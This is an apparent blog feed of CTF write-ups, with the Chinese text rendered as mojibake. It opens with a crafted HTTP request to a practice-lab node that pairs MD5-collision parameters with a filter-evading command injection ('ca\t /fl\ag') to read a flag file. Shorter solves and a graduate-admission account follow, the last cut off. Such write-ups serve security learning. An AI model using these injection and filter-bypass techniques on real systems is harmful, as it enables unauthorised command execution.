class="line">a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯·æ±‚åŒ…:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\t%20/fl\ag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1029</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC</span><br></pre></td></tr></table></figure><p>å“åº”åŒ…å¦‚ä¸‹å›¾ï¼š</p><img src="http://cdn.polowong.top/static/images/axbweb1.jpg"><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¥½ä¹…æ²¡åˆ·webäº†ï¼Œå¤ªèœäº†ï¼Œè¿™é“é¢˜ä¸€å¼€å§‹æ²¡æ€è·¯ï¼Œçœ‹ç€å¸ˆå‚…ä»¬çš„wpå¤ç°å‡ºæ¥çš„ï¼Œè¸©å‘è¸©äº†å¤§æ¦‚ä¸€ä¸ªå°æ—¶ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å±±ä¸œçœç½‘ç»œæŠ€æœ¯å¤§èµ›-ç½‘ç»œå®‰å…¨èµ›é“åˆèµ›ç¬¬äºŒåœºwp</title>
      <link href="2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/"/>
      <url>2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/</url>
      
        <content type="html"><![CDATA[<h1 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h1><p>ç»„å§”ä¼šå¤ªé€†å¤©äº†ï¼Œpwnç¯å¢ƒæŒ‚äº†ï¼Œç¾¤é‡Œæ²¡äººç†çš„</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>è¿›å…¥é¦–é¡µæœ‰ä¸ªæç¤ºï¼ŒæŸ¥çœ‹æºç åpsw.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    highlight_file( <span class="keyword">__FILE__</span> );</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$string</span>,<span class="variable">$option</span>=<span class="string">&#x27;encode&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$option</span>==<span class="string">&#x27;encode&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$lenght</span>=strlen(<span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$lenght</span>;<span class="variable">$x</span>++) &#123; </span><br><span class="line"></span><br><span class="line">            @<span class="variable">$tmp</span>=substr(<span class="variable">$string</span>,<span class="variable">$x</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ord</span>=ord(<span class="variable">$tmp</span>)+<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            @<span class="variable">$result</span>=<span class="variable">$result</span>.chr(<span class="variable">$ord</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$option</span>==<span class="string">&#x27;decode&#x27;</span>)&#123;</span><br><span class="line">       </span><br><span class="line">      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    encode(<span class="string">&#x27;_Y^kdg_k&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠè¿™æ®µä»£ç æ”¾åˆ°æœ¬åœ°ç”¨phpstudyè·‘èµ·æ¥ï¼Œæœ€åè°ƒç”¨æ—¶decodeæ¢æˆencodeï¼Œè·‘å‡ºæ¥ä¸ªå¯†ç ï¼Œä¸ºichunqiuï¼Œè¾“å…¥åˆ°é¦–é¡µå³å¯è·å¾—flag</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><p>ä¸€å¼ å›¾ç‰‡ï¼Œç›´æ¥stegsolve</p><img src="http://cdn.polowong.top/static/images/pgy.png"><p>å¾€å³ç‚¹ï¼Œæœ‰ä¸€å¼ äºŒç»´ç </p><img src="http://cdn.polowong.top/static/images/sdcsmisc.jpg">æ‰«ä¸‹æ¥base32è§£å¯†å³å¯å¾—åˆ°flagã€‚]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç»œå®‰å…¨ä¸“ä¸š-å¤ä»¤è¥/é¢„æ¨å…é¢ç»</title>
      <link href="2020/10/12/%E9%9D%A2%E7%BB%8F/"/>
      <url>2020/10/12/%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h1><p>ç°åœ¨æ˜¯2020å¹´10æœˆ12æ—¥ä¸‹åˆ18ç‚¹19åˆ†ï¼Œæˆ‘äºä»Šå¤©ä¸Šåˆæ”¶åˆ°äº†æ¥è‡ªç”µå­ç§‘æŠ€å¤§å­¦çš„å½•å–é€šçŸ¥ï¼Œç¡®å®šåï¼Œæ„å‘³ç€ä¿ç ”ä¹‹æ—…æ­£å¼ç»“æŸã€‚</p><img src="http://cdn.polowong.top/static/images/uestc.jpg"><p>åœ¨è¿™é•¿è¾¾ä¸€å¹´çš„å‡†å¤‡æ—¶é—´é‡Œï¼Œæ„Ÿè°¢çˆ¶æ¯ã€å®¶äººã€å­¦æ ¡ã€å­¦é™¢å¯¹æˆ‘çš„æ”¯æŒï¼Œæ„Ÿè°¢ä¿ç ”å‰è¾ˆå¯¹æˆ‘çš„æŒ‡ç‚¹ï¼Œæ„Ÿè°¢æœ‹å‹ä»¬ä¸ºæˆ‘æä¾›ä¿¡æ¯ï¼ŒåŠ æ²¹é¼“åŠ²ã€‚</p><h1 id="å¤ä»¤è¥å’Œé¢„æ¨å…æƒ…å†µ"><a href="#å¤ä»¤è¥å’Œé¢„æ¨å…æƒ…å†µ" class="headerlink" title="å¤ä»¤è¥å’Œé¢„æ¨å…æƒ…å†µ"></a>å¤ä»¤è¥å’Œé¢„æ¨å…æƒ…å†µ</h1><p>å¤ä»¤è¥ç”³è¯·å­¦æ ¡ï¼š30+æ‰€985ï¼Œ211å­¦æ ¡ï¼Œåªæœ‰å±±å¤§ã€ä¸­æµ·æ´‹ã€ä¸­å¤®è´¢ç»ã€å›½é˜²ç§‘å¤§ç”µå­å¯¹æŠ—å­¦é™¢é€šè¿‡äº†åˆå®¡ã€‚</p><p>å¤ä»¤è¥é€šè¿‡å­¦æ ¡ï¼šä¸­æµ·æ´‹ä¸“ç¡•ã€å›½é˜²ç§‘å¤§ç”µå­å¯¹æŠ—å­¦é™¢ ç½‘ç»œå®‰å…¨ å­¦ç¡•ï¼Œå…¶ä¸­æ‹’ç»äº†ä¸­å¤®è´¢ç»çš„é¢è¯•ã€‚</p><p>é¢„æ¨å…ç”³è¯·å­¦æ ¡ï¼šå±±å¤§ã€å¤©å¤§ã€ç”µå­ç§‘å¤§ã€è¥¿åŒ—å·¥ä¸šå¤§å­¦ã€å“ˆå·¥å¤§ã€å¤æ—¦ã€è¥¿ç”µç­‰ã€‚</p><p>é¢„æ¨å…é€šè¿‡å­¦æ ¡ï¼šå±±å¤§ç½‘å®‰å­¦ç¡•ã€å¤©å¤§ç½‘å®‰å­¦ç¡•ã€ç”µå­ç§‘å¤§ç½‘å®‰å­¦ç¡•ï¼ˆå…¶ä¸­æ‹’ç»äº†è¥¿åŒ—å·¥å¤§ã€è¥¿ç”µé¢è¯•ï¼‰</p><p>æœ€ç»ˆå»å‘ï¼šç”µå­ç§‘æŠ€å¤§å­¦-è®¡ç®—æœºå­¦é™¢-ç½‘ç»œç©ºé—´å®‰å…¨-å­¦ç¡• ï¼Œå¼ å°æ¾æ•™æˆå›¢é˜Ÿ ï¼Œç ”ç©¶æ–¹å‘ï¼šäº‘è®¡ç®—ä¸IOTå®‰å…¨ã€‚</p><h1 id="ä¸ªäººæƒ…å†µä»‹ç»"><a href="#ä¸ªäººæƒ…å†µä»‹ç»" class="headerlink" title="ä¸ªäººæƒ…å†µä»‹ç»"></a>ä¸ªäººæƒ…å†µä»‹ç»</h1><h2 id="èƒŒæ™¯ç®€è¿°"><a href="#èƒŒæ™¯ç®€è¿°" class="headerlink" title="èƒŒæ™¯ç®€è¿°"></a>èƒŒæ™¯ç®€è¿°</h2><p>GPA:4.1/5.0ï¼ˆä¸“ä¸š1/49ï¼‰;  CET-4:540;  CET-6:548;</p><p>ä¸€ç¯‡å›½å®¶çº§æ™®åˆŠï¼Œç¾èµ›ä¸€ç­‰å¥–ï¼Œè“æ¡¥æ¯çœäºŒï¼Œä¸¤æ¬¡æ ¡ä¸€ç­‰å¥–å­¦é‡‘ã€å±±ä¸œçœæ”¿åºœå¥–å­¦é‡‘ã€æ•°æ¬¡CTFç«èµ›ç»å†ã€‚</p><p>ä¸€æ®µä¸“ä¸šçŸ­æœŸå®ä¹ ç»å†ï¼Œä¸¤ä¸ªå°é¡¹ç›®ã€‚ï¼ˆå…¨éƒ¨ä¸“ä¸šé«˜åº¦ç›¸å…³ï¼‰</p><h2 id="è¯¦ç»†ä»‹ç»"><a href="#è¯¦ç»†ä»‹ç»" class="headerlink" title="è¯¦ç»†ä»‹ç»"></a>è¯¦ç»†ä»‹ç»</h2><p>æˆ‘æ¥è‡ªå±±ä¸œçœä¸€æ‰€ä¸€æœ¬å­¦æ ¡â€”â€”æ›²é˜œå¸ˆèŒƒå¤§å­¦ï¼Œæœ¬ç§‘èƒŒæ™¯é€šä¿—åœ°è®²å«åšâ€œåŒéâ€ã€‚</p><p>æˆ‘è‡ªåˆä¸­èµ·å¯¹ç½‘ç»œå®‰å…¨æŠ€æœ¯æ„Ÿå…´è¶£ï¼Œä¸€ç›´åœ¨æ–­æ–­ç»­ç»­åœ°æ‘¸ç´¢ï¼Œå¤§å­¦é€‰æ‹©äº†è½¯ä»¶å·¥ç¨‹ä¸“ä¸šï¼Œç®—æ˜¯æ­£å¼è¿›å…¥è®¡ç®—æœºè¡Œä¸šç§‘ç­ã€‚</p><p>å¤§ä¸€æ²¡æœ‰ç‰¹åˆ«è®¤çœŸå­¦ä¹ ï¼ŒGPAä¸º3.8/5ï¼Œæš‘å‡æœ‰ä¸€æ®µé¦™æ¸¯è®¿å­¦ç»å†ï¼Œæ— æ ¡çº§ä»¥ä¸Šå¥–é¡¹ã€‚</p><p>å¤§ä¸€ä»é¦™æ¸¯å›æ¥åï¼ŒåŠ±å¿—å»æ¸¯æ ¡ï¼Œç»å’¨è¯¢åGPAå¯¹æˆ‘æ¥è¯´è‡³å°‘è¦4ä»¥ä¸Šï¼Œäºæ˜¯å¤§äºŒå¼€å§‹æ¯å¤©è®¤çœŸå­¦ä¹ ä¸“ä¸šçŸ¥è¯†ï¼Œæ³¡è‡ªä¹ å®¤ã€‚å¤§äºŒé€šè¿‡äº†å››å…­çº§è€ƒè¯•ï¼Œå››çº§540ï¼Œå…­çº§ç¬¬ä¸€æ¬¡501ã€‚æ‹¿åˆ°äº†è“æ¡¥æ¯ç¼–ç¨‹å±±ä¸œçœäºŒç­‰å¥–ï¼ˆæ°´ï¼‰ï¼Œéšå¸ˆå“¥å»å¤–çœå‚åŠ äº†ä¸¤æ¬¡CTFçº¿ä¸‹èµ›ï¼ˆåˆ’æ°´ï¼‰ï¼Œæ²¡ä»€ä¹ˆæˆç»©ã€‚å¤§äºŒæœ€ç»ˆGPAä¸º4.01ï¼Œå¤§äºŒå­¦å¹´GPAä¸º4.32ï¼Œå…¨å¹´çº§æœ€é«˜ã€‚</p><p>å¤§ä¸‰åœ¨å¸ˆå“¥çš„å»ºè®®ä¸‹å†³å®šå°è¯•ä¿ç ”ï¼Œäºæ˜¯å¼€å§‹ä»å…¬ä¼—å·äº†è§£ç›¸å…³æ”¿ç­–ä¿¡æ¯ï¼Œä¸€å¼€å§‹ä¹Ÿæ˜¯æ‡µæ‡‚æ— çŸ¥çš„çŠ¶æ€ï¼ŒçŸ¥é“äº†éœ€è¦å‡†å¤‡ç®€å†ã€é¡¹ç›®ã€ç«èµ›ã€è®ºæ–‡ã€å››å…­çº§ã€‚</p><h1 id="ä¿ç ”å‡†å¤‡"><a href="#ä¿ç ”å‡†å¤‡" class="headerlink" title="ä¿ç ”å‡†å¤‡"></a>ä¿ç ”å‡†å¤‡</h1><p>å¤§ä¸‰ä¸Šå­¦æœŸé€šè¿‡äº†å…­çº§è€ƒè¯•ï¼Œåœ¨ä¸¥æ ¼çš„æ¨¡æ‹Ÿè®­ç»ƒä¸‹æ‹¿åˆ°äº†548åˆ†ï¼Œè¿˜ç®—æ»¡æ„ã€‚ç”±äºç–«æƒ…åŸå› åœ¨å®¶è€½è¯¯äº†ä¸€æ®µæ—¶é—´ï¼Œè¿‡å¹´é‚£æ®µæ—¶é—´ä¸»è¦åœ¨å®¶å­¦ä¿ç ”è¯¾ï¼Œäº†è§£å¦‚ä½•å†™ä¸ªäººç®€å†ã€è‡ªæˆ‘ä»‹ç»ã€è‡ªæˆ‘é™ˆè¿°ã€å­¦æ ¡ç”³è¯·ç­‰ç›¸å…³æµç¨‹ã€‚</p><p>2020å¹´2æœˆä»½ä¸ä¸¤ä½æ•°å­¦çš„é˜Ÿå‹ä¸€èµ·å‚åŠ äº†ç¾å›½å¤§å­¦ç”Ÿæ•°å­¦å»ºæ¨¡ç«èµ›ï¼Œæˆ‘åŸºæœ¬è´Ÿè´£é™¤äº†å†™è®ºæ–‡å’Œå»ºæ¨¡å¤–çš„å…¶ä»–å†…å®¹ã€‚ï¼ˆæˆ‘æ˜¯è¾…åŠ©ï¼‰ï¼Œæœ€ç»ˆæ‹¿äº†å›½é™…ä¸€ç­‰å¥–çš„æˆç»©ï¼Œè¿™ä¸æˆ‘ä¸¤ä½é˜Ÿå‹çš„åŠªåŠ›æ˜¯åˆ†ä¸å¼€çš„ï¼Œè‡´è°¢ã€‚</p><p>2020å¹´2æœˆä»½å¤§è‡´å‡†å¤‡å¥½äº†ç®€å†ã€è‡ªæˆ‘ä»‹ç»ï¼ˆä¸­è‹±æ–‡ï¼Œé•¿çŸ­å„ä¸€ä»½ï¼Œå…±å››ä»½ï¼‰ã€ä¸ªäººé™ˆè¿°ã€æ¨èä¿¡ã€è¯ä¹¦è¯ä»¶æ‰«æç­‰æ–‡ä¹¦å·¥ä½œã€‚ç®€å†çš„å®Œå–„å·¥ä½œä¸€ç›´åˆ°æœ€åä¸€æ¬¡é¢è¯•å‰ï¼Œçº¦å››äº”åæ¬¡å¤§å¤§å°å°çš„ä¿®æ”¹å§ã€‚</p><p>2020å¹´ä¸‰æœˆä»½æˆåŠŸæŠ•ç¨¿äº†æˆ‘åœ¨ä¸€æœˆä»½å¼€å§‹å†™çš„ä¸€ç¯‡æœŸåˆŠï¼ŒæŠ•ç¨¿è‡³å›½å®¶çº§æ™®åˆŠï¼ŒæœŸé—´å­¦ä¹ äº†å¾ˆå¤šçŸ¥è¯†ã€‚</p><p>2020å¹´ä¸‰æœˆå¼€å§‹æ­£å¼æ‰“CTFã€å­¦ä¹ CTFçŸ¥è¯†ï¼Œå†™åšå®¢ã€‚</p><p>2020å¹´4æœˆå®Œæˆäº†åŸºäºflaskæ¡†æ¶çš„å›¾ä¹¦ç®¡ç†ç³»ç»Ÿï¼ˆä¸€ä¸ªå¾ˆå°çš„é¡¹ç›®ï¼Œæ€»å…±å°±å››äº”ç™¾è¡Œä»£ç ï¼‰å››æœˆä»½å¼€å§‹äº†è§£ä¸“ä¸šå‰æ™¯ï¼Œå‘å„ä½å‰è¾ˆä»¥åŠçŸ¥ä¹ã€äº¤æµç¾¤é‡Œæ‰“å¬ä¸“ä¸šå¼ºæ ¡ã€å¼ºè€å¸ˆã€‚</p><p>2020å¹´5æœˆå®Œæˆäº†åŸºäºNmapå’ŒMasscanæ‰«æå™¨çš„Webæ‰«æå™¨ï¼Œå¹¶æ”¹è¿›äº†CTF-wscanæ‰«æå™¨ï¼ˆä¸»è¦æ˜¯ä¼˜åŒ–äº†å¤šçº¿ç¨‹ä¸é‡å¤æ‰«æé—®é¢˜ï¼Œå½“ç„¶ç›®å‰è¿˜å­˜åœ¨ä¸€äº›bugï¼‰ã€‚äº”æœˆä»½å¼€å§‹è”ç³»å¯¼å¸ˆï¼Œå…¶ä¸­æœ‰ä¸€ä½å—æ–¹å­¦æ ¡çš„è€å¸ˆä¸ºæˆ‘æä¾›äº†ä¸€æ¬¡å®è´µçš„å®ä¹ æœºä¼šã€‚åœ¨æ­¤å‘é­è€å¸ˆè‡´è°¢ã€‚</p><p>2020å¹´6æœˆåœ¨è€å¸ˆçš„æ¨èä¸‹èµ´å¹¿å·è¿›è¡Œå®ä¹ ï¼ŒèŒä½æ˜¯æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆã€‚ä¸¤ä¸ªæœˆçš„å®ä¹ æœŸé—´ä¸»è¦æ˜¯å­¦ä¼šäº†ä¸€äº›æ€è·¯ä¸å·¥å…·ï¼Œæ”¶è·äº†ä¸€äº›å¥½å‹ä¸äººè„‰ã€‚æœŸé—´ä¹Ÿåœ¨ä¸æ–­åœ°æŠ•é€’ç®€å†ä¸è”ç³»è€å¸ˆã€‚å…­æœˆåº•é€šè¿‡äº†ä¸­æµ·æ´‹ã€å±±å¤§çš„åˆå®¡ã€‚</p><p>2020å¹´7æœˆæ‹¿åˆ°äº†ä¸­æµ·æ´‹ä¼˜è¥ï¼Œå›½é˜²ç§‘å¤§ç”µå­å¯¹æŠ—å­¦é™¢å½•å–èŒƒå›´ç¬¬äºŒåï¼Œå‚åŠ ç”µå­ç§‘æŠ€å¤§å­¦å¯¼å¸ˆå›¢é˜Ÿé¢è¯•å¹¶é€šè¿‡ï¼Œä¸æ­¤åŒæ—¶ç»§ç»­å®ä¹ ã€‚</p><p>2020å¹´8æœˆé€šè¿‡äº†æ·±ä¿¡æœåŒ—äº¬å®‰å…¨ç ”å‘ä¸­å¿ƒå®ä¹ ç”Ÿä¸¤è½®æŠ€æœ¯é¢ï¼Œå› å­¦æ ¡æ—¶é—´å†²çªåŸå› æ”¾å¼ƒhré¢ã€‚</p><p>2020å¹´9æœˆé€šè¿‡åŒ—äº¬hwè“é˜Ÿé¢è¯•ï¼Œè–ªèµ„æ˜¯æœ€ä½çš„1.3kä¸€å¤©åŒ…åƒä½ï¼ˆå½©ç¬”ï¼‰ã€é€šè¿‡äº†å¤©å¤§å¤è¯•ï¼Œæ‹¿åˆ°äº†å­¦ç¡•offer</p><p>2020å¹´10æœˆé€šè¿‡ç”µå­ç§‘å¤§ã€å±±å¤§å¤è¯•ï¼Œæ‹¿åˆ°æœ¬æ ¡æ¨å…èµ„æ ¼ï¼Œæ‹¿åˆ°å­¦ç¡•offerå¹¶ä¸Šå²¸ã€‚</p><h1 id="åŠå‘Š"><a href="#åŠå‘Š" class="headerlink" title="åŠå‘Š"></a>åŠå‘Š</h1><p><strong>ä¿ç ”æ˜¯ä¸€åœºä¿¡æ¯æˆ˜ï¼Œä½†è¦å­¦ä¼šå¦‚ä½•è·å–æœ‰ç”¨ã€æœ‰ä»·å€¼çš„ä¿¡æ¯ï¼Œå­¦ä¼šäº¤æœ‹å‹ï¼Œæœ‰æ—¶å€™å¤–æ ¡æœ‹å‹çš„ä¿¡æ¯èƒ½å†³å®šä½ çš„å‘½è¿</strong></p><p><strong>è”ç³»è€å¸ˆå¾ˆé‡è¦ï¼Œä½ ä¼šå‘ç°æˆ‘æ‰€æœ‰å…¥è¥ä¸”æ‹¿åˆ°offerçš„å­¦æ ¡éƒ½æå‰è”ç³»äº†è€å¸ˆã€‚</strong></p><h1 id="å¤ä»¤è¥é¢ç»"><a href="#å¤ä»¤è¥é¢ç»" class="headerlink" title="å¤ä»¤è¥é¢ç»"></a>å¤ä»¤è¥é¢ç»</h1><p>ç”±äºå¤ä»¤è¥éƒ½åœ¨å·ï¼Œå…¥è¥éå¸¸å°‘ï¼Œå±±å¤§æ˜¯æŠ¥åçš„å…¨å…¥è¥äº†ï¼Œæ²¡æœ‰å‚è€ƒä»·å€¼ã€‚</p><p>ä¸‹é¢æŒ‰ç…§æ—¶é—´é¡ºåºæ¥è¯´</p><h2 id="ä¸­å›½æµ·æ´‹å¤§å­¦-ä¿¡æ¯å­¦é™¢"><a href="#ä¸­å›½æµ·æ´‹å¤§å­¦-ä¿¡æ¯å­¦é™¢" class="headerlink" title="ä¸­å›½æµ·æ´‹å¤§å­¦ ä¿¡æ¯å­¦é™¢"></a>ä¸­å›½æµ·æ´‹å¤§å­¦ ä¿¡æ¯å­¦é™¢</h2><p>ä¸­æµ·æ´‹ç¬¬ä¸€ä¸ªé¢è¯•ï¼Œæˆ‘æå‰è”ç³»äº†è€å¸ˆï¼Œè€å¸ˆäººå¾ˆå¥½ï¼Œåœ¨ä¿¡æ¯å­¦é™¢åšå®‰å…¨ç®—æ˜¯æ¯”è¾ƒå¥½çš„è€å¸ˆäº†ï¼Œé‚®ä»¶è”ç³»åï¼Œæ­£å¥½è€å¸ˆè´Ÿè´£å¤ä»¤è¥å®¡æ‰¹ï¼Œç»™äº†æˆ‘å…¥è¥èµ„æ ¼ã€‚ä»Šå¹´ä¸­æµ·æ´‹è®¡ç®—æœºå¤ä»¤è¥åˆå®¡æŠ¥äº†å››ç™¾å¤šï¼Œå¯æƒ³è€ŒçŸ¥ã€‚</p><p>åœ¨å…¥è¥åæœ‰ä¸€ä¸ªçƒ­èº«æ´»åŠ¨ï¼Œé€‰å®šä¸€ä¸ªæ–¹å‘ä»¥åŠé—®é¢˜ï¼Œå¯¹è¿™ä¸ªé—®é¢˜å±•å¼€ç ”ç©¶å¹¶å†™è®ºæ–‡å’Œpptå½•å±äº”åˆ†é’Ÿå†…æ±‡æŠ¥ã€‚æˆ‘é€‰çš„æ˜¯ç³»ç»Ÿå®‰å…¨çš„é—®é¢˜ï¼Œmeltdownï¼Œé˜²å¾¡æ–¹æ³•æœ‰KASLRç­‰ã€‚</p><p>é¢è¯•å‰ä¸€æ™šæœ‰ä¸ªæœºè¯•ï¼Œæ®è¯´æœºè¯•ä¸ç®—æˆç»©é‡Œé¢ï¼Œä½†æ˜¯é¢è¯•å®˜ä¼šæœ‰æœºè¯•çš„æˆç»©ã€‚å¤§æ¦‚é¢˜ç›®éƒ½æ˜¯äº›æ¯”è¾ƒç®€å•çš„æ 